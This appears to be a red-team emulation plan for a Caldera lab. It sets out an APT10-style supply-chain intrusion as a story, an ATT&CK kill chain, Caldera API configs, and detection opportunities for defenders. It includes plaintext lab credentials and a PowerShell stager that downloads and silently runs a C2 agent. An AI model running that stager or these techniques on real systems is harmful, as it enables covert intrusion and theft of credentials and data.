---
type: Adversary Operation
title: "Operation Dark Pivot"
description: Supply-chain compromise via developer station — a malicious package backdoors the dev environment in the server segment, enabling quiet lateral movement through workstations to the domain controller with IP exfiltration via DNS.
tags:
  - operation
  - supply-chain
  - developer
  - apt10
  - menupass
  - lateral-movement
  - exfiltration
  - dns
  - windows
generated:
  by: claude-sonnet-4-6
  at: '2026-07-30T17:00:00Z'
status: stable
---

# Operation Dark Pivot

## Story

The organization uses a shared internal package repository. A threat actor — modelled on menuPass (APT10) — compromised a popular internal build utility by publishing a trojanized version to the registry. When a developer on **windows-dev-station (192.168.8.31)** ran their daily build, the malicious package spawned a Sandcat agent and beaconed to `caldera-2`.

The attacker is now sitting inside the **server segment** (192.168.8.x) with a C2 in the workstation segment — beacon traffic crosses the firewall by design. They have developer-level access: source code repositories, build secrets, deployment keys, and internal documentation paths are within reach. But the real prize is the intellectual property on the workstations and the Active Directory database.

The attacker stays patient. They search the dev machine for hardcoded credentials and config files (developers notoriously leave secrets in `.env` files and Git histories). They find the domain password. They move quietly to workstations — first to **windows-client-11**, then elevate privileges and dump the domain admin hash, finally landing on **windows-dc**. They establish COM hijack persistence, NTDS.dit copy, and exfiltrate source code via DNS tunneling to avoid triggering HTTP-based DLP.

**The story arc:** Patient, technical, intelligence-driven. Living off the land. The attacker exploits developer trust and the relatively unmonitored server segment. DNS exfil blends with legitimate traffic.

---

## Narrative

Nobody audits the build pipeline.

That's the thing about developer infrastructure — it's trusted by default. The machines that compile code, run tests, and push to production exist in a kind of institutional blind spot. They're not end-user workstations. They're not servers. They live in between, and in between is where the quiet things happen.

The actor had been inside the internal package registry for six weeks before they moved. They'd found it through a misconfigured API key in a public GitHub commit — a junior developer's mistake, three years old, long forgotten. The key still worked. They used it to publish a single update to an internal build utility called *forge-cli*, version 2.4.1. The change was eleven lines. Nobody reviewed it. Packages rarely get reviewed.

They waited.

---

On a Thursday morning, a developer on *windows-dev-station* ran their daily build.

*forge-cli* executed as it always did. The build completed successfully. The test suite passed. The developer pushed their changes and went to get coffee.

What they didn't see was the second process that had spawned beneath the build — a PowerShell stager, three seconds of execution, a beacon sent across the network to a server in the workstation segment. A response came back. An agent settled in.

The actor was now inside the server segment. Same network as the build infrastructure, the internal registries, the deployment keys. They were in the walls of the building.

They began, as they always did, by looking.

---

The dev station was a goldmine — not because of what was on it, but because of what developers leave lying around. A `.env` file in the project root contained a database connection string with a plaintext password. The Windows Credential Manager held two saved credentials for internal systems. The browser history mapped out the entire internal topology — CI/CD dashboards, admin panels, internal wikis, a Kubernetes management console — a complete picture of the environment drawn in URLs.

They cleared their tracks as they went. PowerShell history, gone. Event logs, wiped. What they found, they hid in Alternate Data Streams where no one would look.

The domain was visible from here. They mapped it — every computer, every subnet, every admin account. The workstation segment was one firewall rule away.

They crossed it via SMB. The ADMIN$ share on *windows-client-11* accepted the credential they'd found in the `.env` file without complaint.

---

On the workstation, they elevated. Fodhelper bypassed UAC cleanly. From the elevated context they could see everything in the domain admin group — names, accounts, last login times. They dumped LSASS. The domain administrator hash was there, clear as daylight.

Two persistence mechanisms went in: a scheduled task for reliability, a COM hijack in the HKCU registry hive for stealth. The COM hijack would survive a credential rotation. It would outlast most incident response playbooks.

WinRM carried them the rest of the way to the domain controller.

---

On *windows-dc* they moved quickly but without urgency. A shadow copy of the volume gave them NTDS.dit — the entire domain, every account, every hash, every password ever set, all of it portable and offline-crackable at leisure. A new domain admin account appeared in Active Directory: *svc_monitor_03*. Unremarkable. It would still be there in six months if no one looked carefully.

They staged source code repositories, internal documentation, deployment configurations — everything a competitor or a foreign intelligence service would pay for. The developer's browser history had shown them exactly where to look.

The archive was compressed, password-protected, split into 50-megabyte chunks that looked like routine backup traffic.

Then it left through DNS.

Not HTTP — DNS. Each chunk encoded into the subdomain field of a query, sent to a resolver the actor controlled, answered with a legitimate-looking response. To a network sensor watching for large outbound transfers, there was nothing to see. Just DNS queries. Hundreds of them, spread across four hours, each one carrying a small piece of everything the organization had built.

---

The developer finished their coffee. The build had passed. It had been a good morning.

On a server the actor controlled, a script was reassembling the chunks into a complete archive. By the time the developer's next commit pushed to production, the actor had already begun analyzing what they'd taken.

The supply chain had done its job. It always does.

No one had touched an end-user. No phishing email. No loud ransomware. No event log entry that wasn't already erased. The organization wouldn't find the COM hijack for months, if ever. The *svc_monitor_03* account would blend in until someone ran an audit that nobody had scheduled.

The build pipeline was already running again. Clean results. Green tests.

Nobody audits the build pipeline.

---

## ATT&CK Kill Chain

| # | Phase | Tactic | Technique | Description |
|---|---|---|---|---|
| 1 | Foothold | Initial Access | T1195.002 — Compromise Software Supply Chain | Trojanized build package beacons from dev station |
| 2 | Establish | Execution | T1059.001 — PowerShell | Sandcat agent runs via PS stager in build context |
| 3 | Explore Dev | Discovery | T1082 — System Info | Enumerate dev station: OS, hostname, domain |
| 4 | Explore Dev | Discovery | T1049 — Network Connections | Map server segment connections and listening services |
| 5 | Explore Dev | Discovery | T1046 — Network Service Scan | Identify open ports on workstation segment (192.168.3.x) |
| 6 | Search for Secrets | Credential Access | T1552.001 — Credentials in Files | Search `.env`, `config.ini`, `appsettings.json`, Git history |
| 7 | Search for Secrets | Credential Access | T1555.004 — Windows Credential Manager | Dump saved credentials from Vault via VaultCmd |
| 8 | Search for Secrets | Credential Access | T1555.003 — Browser Credentials | Steal developer browser saved passwords |
| 9 | Go Quiet | Defense Evasion | T1070.003 — Clear PS History | Wipe PS history and transcript |
| 10 | Go Quiet | Defense Evasion | T1070.001 — Clear Event Logs | Clear dev station event logs |
| 11 | Go Quiet | Defense Evasion | T1564.004 — Alternate Data Streams | Hide staged files in NTFS ADS |
| 12 | Map Domain | Discovery | T1087 — Account Discovery | Enumerate local and domain accounts |
| 13 | Map Domain | Discovery | T1018 — Remote Systems | Adfind: discover AD computers and subnets |
| 14 | Map Domain | Discovery | T1087.002 — Domain Users | Adfind: enumerate domain admin accounts and GPOs |
| 15 | First Pivot | Lateral Movement | T1021.002 — SMB | Copy Sandcat to windows-client-11 via SMB |
| 16 | Escalate | Privilege Escalation | T1548.002 — UAC Bypass (Fodhelper) | Elevate to admin on workstation |
| 17 | Deeper Recon | Discovery | T1069.002 — Domain Groups | Enumerate privileged groups with elevated context |
| 18 | Deeper Harvest | Credential Access | T1003.001 — LSASS Dump | Dump LSASS on workstation for DA credentials |
| 19 | Stay Persistent | Persistence | T1053.005 — Scheduled Task | Register persistence on workstation |
| 20 | Stay Persistent | Persistence | T1546.015 — COM Hijacking | COM hijack for stealthy persistence |
| 21 | Final Pivot | Lateral Movement | T1021.006 — WinRM | Enable WinRM and copy Sandcat to windows-dc |
| 22 | Own Domain | Persistence | T1136.002 — Domain Admin Account | Create hidden domain admin account |
| 23 | Crown Jewels | Credential Access | T1003.003 — NTDS.dit | Copy NTDS.dit via Volume Shadow Copy |
| 24 | Collect IP | Collection | T1119 — Automated Collection | Recursively stage source code and sensitive docs |
| 25 | Collect IP | Collection | T1217 — Browser History | Collect browser history from Chrome/Edge to map internal URLs and systems |
| 26 | Compress | Collection | T1560.001 — Archive | 7-zip with password — split into chunks |
| 27 | Exfil (covert) | Exfiltration | T1048 — DNS Exfiltration | Exfil via DNS-over-HTTPS to bypass HTTP DLP |

---

## Caldera Configuration

### Custom Adversary (Create via API)

```json
POST /api/v2/adversaries
{
  "name": "Operation Dark Pivot - Supply Chain",
  "description": "Patient supply-chain pivot from compromised developer station through workstations to DC. Low-and-slow, living off the land, DNS exfiltration. Modelled on menuPass/APT10 TTPs.",
  "atomic_ordering": [
    "c0177717b47f2cd07949186523fa3c6b",
    "4519d5e005c13213fb80171661d2144c",
    "ba0b398d-91b8-490a-bed2-f959afa8e1aa",
    "780cde60c956ccbff24c43ff7b7e70ea",
    "10ce4e4c0a8d29ead8968da8156d8358",
    "b267badd4e6f3601450582cb07d9f333",
    "43b3754c-def4-4699-a673-1d85648fda6a",
    "06889e6e9834c7437235d17396c09336",
    "fcf71ee3-d1a9-4136-b919-9e5f6da43608",
    "48168a8ea0a186532b156fca59756a64",
    "9ce5bf9f-44ec-44c4-bbe0-6d68a83e1b76",
    "c6f643adfd3ed9cf2806bfcb297e0eee",
    "7d7d274f02745cafd70f3769e3a0c181",
    "2afae782-6d0a-4fbd-a6b6-d1ce90090eac",
    "65048ec1-f7ca-49d3-9410-10813e472b30",
    "0c328b7ec82e0074cbb0745db3a53602",
    "473e5707-5786-4f53-934f-22175c1059b0",
    "381ee532-e000-4c1e-9073-903cb1ed1778",
    "38400f50-9333-4c3e-9764-56380252e4b4",
    "e643e21318c069d0a576da91650c76fe",
    "4908fdc4-74fc-4d7c-8935-26d11ad26a8d",
    "c6bf167afe0b85a1e88127fc0d093e4d",
    "548f5aa3ec2fcfc6872ee10975480f29",
    "10fad81e-3f68-47be-83b6-fbee7711c6a9",
    "9bc50b2e45993cea40d17d7894200f19",
    "27a2c04ffd606d30148b37d95e94d99e",
    "f6a85e32c9ae92a1addb45d4663043e9",
    "aaf0e56d89a095f70edda858346cda61"
  ]
}
```

### Ability Manifest

| Order | Ability ID | Technique | Name |
|---|---|---|---|
| 1 | `c0177717b47f2cd07949186523fa3c6b` | T1059.001 | PowerShell -Command execution |
| 2 | `4519d5e005c13213fb80171661d2144c` | T1082 | BIOS / System Info Discovery |
| 3 | `ba0b398d-91b8-490a-bed2-f959afa8e1aa` | T1049 | Network Connections Discovery |
| 4 | `780cde60c956ccbff24c43ff7b7e70ea` | T1552.001 | Access unattend.xml — search for creds in files |
| 5 | `10ce4e4c0a8d29ead8968da8156d8358` | T1555.004 | Access Saved Credentials via VaultCmd |
| 6 | `b267badd4e6f3601450582cb07d9f333` | T1555.003 | BrowserStealer (Chrome/Edge/Firefox) |
| 7 | `43b3754c-def4-4699-a673-1d85648fda6a` | T1070.003 | Avoid logs |
| 8 | `06889e6e9834c7437235d17396c09336` | T1070.003 | Clear PowerShell Session History |
| 9 | `fcf71ee3-d1a9-4136-b919-9e5f6da43608` | T1070.001 | Clear Windows Event Logs |
| 10 | `48168a8ea0a186532b156fca59756a64` | T1564.004 | Alternate Data Streams (ADS) |
| 11 | `9ce5bf9f-44ec-44c4-bbe0-6d68a83e1b76` | T1087 | Account Discovery |
| 12 | `c6f643adfd3ed9cf2806bfcb297e0eee` | T1018 | Adfind — AD Computer Objects |
| 13 | `7d7d274f02745cafd70f3769e3a0c181` | T1087.002 | Adfind — AD Admin Accounts |
| 14 | `2afae782-6d0a-4fbd-a6b6-d1ce90090eac` | T1069.002 | Account-type Admin Enumerator |
| 15 | `65048ec1-f7ca-49d3-9410-10813e472b30` | T1021.002 | Copy Sandcat via SMB (to workstation) |
| 16 | `0c328b7ec82e0074cbb0745db3a53602` | T1548.002 | Bypass UAC via Fodhelper |
| 17 | `473e5707-5786-4f53-934f-22175c1059b0` | T1003.001 | UAC Bypass + LSASS Credential Dump |
| 18 | `381ee532-e000-4c1e-9073-903cb1ed1778` | T1053.005 | Agent Persistence (Scheduled Task) |
| 19 | `38400f50-9333-4c3e-9764-56380252e4b4` | T1546.015 | COM Hijacking via TreatAs |
| 20 | `e643e21318c069d0a576da91650c76fe` | T1021.006 | Enable Windows Remote Management |
| 21 | `4908fdc4-74fc-4d7c-8935-26d11ad26a8d` | T1570 | Copy Sandcat via WinRM (to DC) |
| 22 | `c6bf167afe0b85a1e88127fc0d093e4d` | T1136.002 | Create Windows domain admin user |
| 23 | `548f5aa3ec2fcfc6872ee10975480f29` | T1003.003 | Copy NTDS.dit from Volume Shadow Copy |
| 24 | `10fad81e-3f68-47be-83b6-fbee7711c6a9` | T1119 | Advanced File Search and Stager |
| 25a | `9bc50b2e45993cea40d17d7894200f19` | T1217 | Extract Chrome Browsing History |
| 25b | `27a2c04ffd606d30148b37d95e94d99e` | T1217 | Extract Edge Browsing History |
| 26 | `f6a85e32c9ae92a1addb45d4663043e9` | T1560.001 | Compress Data with 7zip (password + split) |
| 27 | `aaf0e56d89a095f70edda858346cda61` | T1048 | DNS Exfiltration (DoH) |

### Fact Source (Create Custom)
```json
POST /api/v2/sources
{
  "name": "Dark Pivot - Dev Segment",
  "facts": [
    {"trait": "remote.host.ip", "value": "192.168.3.32", "score": 1},
    {"trait": "remote.host.ip", "value": "192.168.3.31", "score": 1},
    {"trait": "remote.host.ip", "value": "192.168.1.31", "score": 1},
    {"trait": "domain.user.name", "value": "lab-user", "score": 1},
    {"trait": "domain.user.password", "value": "Paloalto1!", "score": 1},
    {"trait": "domain.user.name", "value": "administrator", "score": 1},
    {"trait": "domain.user.password", "value": "Paloalto1!", "score": 1}
  ]
}
```

### Operation Launch JSON
```json
POST /api/v2/operations
{
  "name": "Operation Dark Pivot",
  "adversary": {"adversary_id": "003e3455-d435-4353-be68-b5989a2fb371"},
  "group": "red",
  "planner": {"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"},
  "source": {"id": "<dark-pivot-source-id>"},
  "obfuscator": "steganography",
  "jitter": "10/30",
  "autonomous": 1,
  "auto_close": false,
  "visibility": 51
}
```

**C2: caldera-2 (192.168.3.21)** — dev-station is in the Server segment (192.168.8.x); using caldera-2 in the Workstation segment (192.168.3.x) ensures all beacon traffic crosses the firewall.

**Planner: atomic** — precise sequential ordering reflects the attacker's deliberate, staged approach. High jitter (10–30s) models slow beaconing to avoid timing-based detection. **Steganography obfuscation** — commands hidden in image files, matching the attacker's intent to blend with normal dev traffic.

### Agent Deployment (Entry Point)
Deploy on **windows-dev-station (192.168.8.31)** as `lab-user / Paloalto1!`:
```powershell
$url="http://192.168.3.21:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go-windows");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders["Content-Disposition"].Split("=")[1];[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);Start-Process -FilePath "C:\Users\Public\$name.exe" -ArgumentList "-server http://192.168.3.21:8888 -group red" -WindowStyle Hidden
```

---

## Why This Story Is Distinct

| Attribute | Silent Fog | Crimson Tide | **Dark Pivot** |
|---|---|---|---|
| Threat actor motivation | Espionage | Financial (ransomware) | **IP theft / espionage** |
| Entry vector | Phishing (user workstation) | Stolen creds (privileged host) | **Supply chain (dev machine)** |
| Network entry point | 192.168.3.32 (workstation segment) | 192.168.3.31 (workstation segment) | **192.168.8.31 (server segment)** |
| Speed | Slow (days) | Fast (minutes) | **Medium (hours)** |
| Noise level | Low | High | **Very low** |
| Obfuscation | base64jumble | plain-text | **steganography** |
| Exfil channel | HTTP C2 | HTTP C2 | **DNS (DoH)** |
| Unique foothold | Phishing victim | Valid credential purchase | **Software supply chain** |

---

## Detection Opportunities

| Phase | What a defender would see |
|---|---|
| Foothold | Unexpected outbound connection from build process (devenv.exe / npm / pip) |
| Credential search | File access to `.env`, `web.config`, `appsettings.json` from unusual process |
| Vault access | `vaultcmd.exe` execution (rare on dev stations) |
| Log clearing | Security event 1102 (audit log cleared), Sysmon Event ID 5 |
| ADS activity | Alternate data stream creation on non-Office files |
| SMB lateral | ADMIN$ write from server segment to workstation segment |
| UAC bypass | Fodhelper.exe spawning child process with elevated token |
| LSASS dump | LSASS memory read (Sysmon Event ID 10) from non-system process |
| COM hijack | Unexpected COM server registration in HKCU hive |
| WinRM | `winrm.cmd` or WSMan traffic from workstation to DC |
| NTDS copy | `vssadmin.exe` shadow copy creation + ntds.dit file access |
| DNS exfil | High-volume DNS queries with long subdomains, unusual query patterns |
